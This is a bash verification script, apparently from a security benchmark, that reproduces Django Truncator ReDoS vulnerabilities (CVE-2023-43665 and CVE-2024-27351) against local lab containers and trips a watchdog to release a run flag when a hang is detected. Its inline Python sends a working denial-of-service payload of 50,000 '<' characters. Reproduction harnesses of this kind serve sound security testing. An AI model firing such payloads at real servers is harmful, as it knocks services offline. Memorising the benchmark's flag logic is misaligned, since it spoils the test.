#!/usr/bin/env bash
# verify.sh --seed|--residual — Django Truncator ReDoS (CVE-2023-43665 seed /
# CVE-2024-27351 residual). 效果=Truncator 挂起 -> watchdog 释放当前 RUN_FLAG。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

# compose port 必须带 --profile，否则 profile 服务不可见。
# 后续 verify 上 compose port 可能失败，回退 start.sh 写入的 compose.env。
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" 8000 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
WDPORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port watchdog 8888 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}" ;;
    v1) PORT="${PORT_V1_0:-}" ;;
    v2) PORT="${PORT_V2_0:-}" ;;
  esac
fi
WDPORT="${WDPORT:-${PORT_WATCHDOG_0:-}}"
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "$PORT" ]] || { echo "compose port $VERSION:8000 failed (need --profile + compose.env)" >&2; exit 20; }
[[ -n "$WDPORT" ]] || { echo "watchdog port failed" >&2; exit 20; }
BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2023-43665: '\t'*5_000_000 + '<'*30_000（V0 挂起 / V1 cap 切掉尾巴 → fast）
  OUT="$("$PY" "$CASE_DIR/poc/original_poc.py" "$BASE" 2>/dev/null)" || OUT="{}"
else
  # CVE-2024-27351 residual: within-cap '<'*50000 (inline; V1 still O(n^2)).
  # 30k can finish <1s; 150k never returns and wedges the sync worker so later
  # residual gates (wrong/stale then the real gate) cannot reach the watchdog.
  OUT="$("$PY" - "$BASE" <<'PY'
import http.client, json, socket, sys, time
base = sys.argv[1]
host, port = base.replace("http://", "").split(":")
body = (b"<" * 50000)
best = {"latency_ms": 0, "timeout": False, "resp": None, "server_ms": 0}
for _ in range(5):
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=20.0)
        c.request("POST", "/truncate", body=body,
                  headers={"Content-Type": "text/plain; charset=utf-8",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        server_ms = 0
        try:
            server_ms = float(json.loads(resp).get("server_ms") or 0)
        except Exception:
            pass
        rec = {"latency_ms": round(max(ms, server_ms), 1), "timeout": False,
               "resp": resp[:200], "server_ms": server_ms}
    except (socket.timeout, TimeoutError, OSError):
        ms = (time.perf_counter() - t0) * 1000.0
        rec = {"latency_ms": round(ms, 1), "timeout": True, "resp": None, "server_ms": 0}
    if rec.get("timeout") or rec["latency_ms"] > best["latency_ms"]:
        best = rec
    if rec.get("timeout") or rec["latency_ms"] > 800:
        break
print(json.dumps(best))
PY
)" || OUT="{}"
fi

echo "$OUT" | head -c 400; echo

# 10s HTTP timeout / latency>2s = hang signal → trip watchdog（释放当前 PCB_FLAG）
HANG="$("$PY" -c "
import json,sys
try:
    d=json.loads(sys.argv[1])
except Exception:
    d={}
ms=d.get('latency_ms') or 0
print('1' if d.get('timeout') or (isinstance(ms,(int,float)) and float(ms)>800) else '0')
" "$OUT" 2>/dev/null || echo 0)"
if [[ "$HANG" == "1" ]]; then
  curl -sS -m 3 "http://127.0.0.1:${WDPORT}/trip" >/dev/null 2>&1 || true
fi

# Recycle the sync worker after residual so wrong/stale ReDoS does not wedge
# the later gate residual (run_mvp order: seed → wrong residual → stale residual → gate residual).
recycle() {
  if [[ "$MODE" == "--residual" ]]; then
    docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" restart "$VERSION" >/dev/null 2>&1 || true
  fi
}

ST=""
for i in $(seq 1 30); do
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null || true)"
  if grep -qF "$RUN_FLAG" <<<"$ST"; then
    echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
    recycle
    exit 0
  fi
  sleep 1
done
echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
recycle
exit 10
